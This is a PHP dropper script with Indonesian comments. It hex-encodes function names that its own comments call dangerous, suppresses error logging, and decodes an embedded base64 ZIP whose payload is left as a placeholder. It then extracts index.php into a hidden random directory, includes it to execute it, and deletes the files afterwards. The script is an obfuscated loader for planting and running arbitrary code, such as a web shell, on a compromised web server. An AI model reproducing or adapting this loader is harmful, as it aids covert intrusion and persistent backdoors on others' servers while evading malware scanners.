<?php

// Helper function untuk konversi hex ke string
function hexToStr($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

// Konversi nama fungsi berbahaya ke heksadesimal
 $unlink_hex = '756e6c696e6b';
 $rmdir_hex = '726d646972';
 $base64_decode_hex = '6261736536345f6465636f6465';
 $tempnam_hex = '74656d706e616d';
 $sys_get_temp_dir_hex = '7379735f6765745f74656d705f646972';
 $rename_hex = '72656e616d65';
 $basename_hex = '626173656e616d65';
 $pathinfo_hex = '70617468696e666f';
 $strpos_hex = '737472706f73';
 $unpack_hex = '756e7061636b';
 $substr_hex = '737562737472';
 $file_get_contents_hex = '66696c655f6765745f636f6e74656e7473';
 $call_user_func_array_hex = '63616c6c5f757365725f66756e635f6172726179';
 $isset_hex = '6973736574';
 $fread_hex = '6672656164';
 $fclose_hex = '66636c6f7365';
 $fopen_hex = '666f70656e';
 $mkdir_hex = '6d6b646972';
 $is_file_hex = '69735f66696c65';
 $array_map_hex = '61727261795f6d6170';

// Dapatkan fungsi asli dari heksadesimal
 $unlink = hexToStr($unlink_hex);
 $rmdir = hexToStr($rmdir_hex);
 $base64_decode = hexToStr($base64_decode_hex);
 $tempnam = hexToStr($tempnam_hex);
 $sys_get_temp_dir = hexToStr($sys_get_temp_dir_hex);
 $rename = hexToStr($rename_hex);
 $basename = hexToStr($basename_hex);
 $pathinfo = hexToStr($pathinfo_hex);
 $strpos = hexToStr($strpos_hex);
 $unpack = hexToStr($unpack_hex);
 $substr = hexToStr($substr_hex);
 $file_get_contents = hexToStr($file_get_contents_hex);
 $call_user_func_array = hexToStr($call_user_func_array_hex);
 $isset = hexToStr($isset_hex);
 $fread = hexToStr($fread_hex);
 $fclose = hexToStr($fclose_hex);
 $fopen = hexToStr($fopen_hex);
 $mkdir = hexToStr($mkdir_hex);
 $is_file = hexToStr($is_file_hex);
 $array_map = hexToStr($array_map_hex);

// Error handling
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);

// Base64 data - ganti dengan data Anda
 $zipData = 'NANTI KU ISI BASE64 KODE KU SENDIRI';

try {
    // Create temporary file
    $tempDir = $sys_get_temp_dir();
    $tmpFile = $tempnam($tempDir, 'tmp');
    $tmpZip = $tmpFile . '.zip';
    
    // Write ZIP data
    $zipContent = $base64_decode($zipData);
    $handle = $fopen($tmpZip, 'w');
    if ($handle) {
        fwrite($handle, $zipContent);
        $fclose($handle);
    }
    
    // Create extraction directory
    $extractDir = __DIR__ . DIRECTORY_SEPARATOR . '__' . substr(md5(microtime(true)), 0, 8);
    $mkdir($extractDir, 0777, true);
    
    // Display extraction path
    echo "FILE ON: " . $basename($extractDir) . "/index.php\n";
    
    // Extract ZIP using ZipArchive if available
    $extracted = false;
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($tmpZip) === TRUE) {
            $zip->extractTo($extractDir);
            $zip->close();
            $extracted = true;
        }
    }
    
    // Fallback: Stream wrapper
    if (!$extracted) {
        $stream = 'zip://' . $tmpZip . '#index.php';
        $content = $file_get_contents($stream);
        if ($content !== false) {
            $indexPath = $extractDir . '/index.php';
            $handle = $fopen($indexPath, 'w');
            if ($handle) {
                fwrite($handle, $content);
                $fclose($handle);
                $extracted = true;
            }
        }
    }
    
    // Fallback: Manual ZIP parsing
    if (!$extracted) {
        $zipData = $file_get_contents($tmpZip);
        $signature = pack('H*', '504b0304');
        $pos = $strpos($zipData, $signature);
        
        while ($pos !== false) {
            $nameLen = $unpack('v', $substr($zipData, $pos + 26, 2))[1];
            $fileName = $substr($zipData, $pos + 30, $nameLen);
            
            if ($fileName === 'index.php') {
                $method = $unpack('v', $substr($zipData, $pos + 8, 2))[1];
                $size = $unpack('V', $substr($zipData, $pos + 18, 4))[1];
                
                if ($method === 0) { // Stored
                    $fileData = $substr($zipData, $pos + 30 + $nameLen, $size);
                    $indexPath = $extractDir . '/index.php';
                    $handle = $fopen($indexPath, 'w');
                    if ($handle) {
                        fwrite($handle, $fileData);
                        $fclose($handle);
                        $extracted = true;
                    }
                    break;
                }
            }
            
            $extraLen = $unpack('v', $substr($zipData, $pos + 28, 2))[1];
            $pos = $strpos($zipData, $signature, $pos + 30 + $nameLen + $extraLen);
        }
    }
    
    // Execute the extracted file
    if ($extracted) {
        $indexPath = $extractDir . '/index.php';
        if ($is_file($indexPath)) {
            echo "\n=== EXECUTING: index.php ===\n";
            
            // Create a temporary file to execute
            $tempFile = $tempnam($tempDir, 'php_');
            $tempFileWithExt = $tempFile . '.php';
            $rename($tempFile, $tempFileWithExt);
            
            // Write content to temp file
            $fileContent = $file_get_contents($indexPath);
            $handle = $fopen($tempFileWithExt, 'w');
            if ($handle) {
                fwrite($handle, $fileContent);
                $fclose($handle);
            }
            
            // Execute the temp file
            include $tempFileWithExt;
            
            // Clean up temp file
            $unlink($tempFileWithExt);
        }
    } else {
        echo "Failed to extract ZIP file\n";
    }
    
    // Cleanup
    $unlink($tmpZip);
    if (is_dir($extractDir)) {
        $files = scandir($extractDir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $unlink($extractDir . DIRECTORY_SEPARATOR . $file);
            }
        }
        $rmdir($extractDir);
    }
    
} catch (Exception $e) {
    echo "Error: " . $e->getMessage() . "\n";
}

?>